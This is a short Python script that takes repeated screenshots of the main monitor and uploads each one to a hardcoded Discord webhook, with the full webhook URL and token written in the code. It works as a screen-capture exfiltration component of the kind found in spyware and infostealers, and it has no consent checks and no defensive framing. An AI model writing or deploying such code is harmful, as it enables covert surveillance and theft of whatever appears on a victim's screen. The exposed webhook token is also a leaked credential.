import mss
import requests
import io
import time
from datetime import datetime

def send_screenshot_to_discord(webhook_url):
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
        image_file = io.BytesIO(png_bytes)
        
        files = {
            'file': (f'screenshot_{datetime.now().strftime("%H%M%S")}.png', image_file, 'image/png')
        }
        
        data = {
            'content': f'Screenshot taken at {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            'username': 'Screenshot Bot'
        }
        
        requests.post(webhook_url, files=files, data=data)

# Replace with your actual Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"

def continuous_screenshots(duration=5, interval=1):
    start_time = time.time()
    
    while (time.time() - start_time) < duration:
        send_screenshot_to_discord(DISCORD_WEBHOOK)
        time.sleep(interval)

if __name__ == "__main__":
    continuous_screenshots(duration=5, interval=1)
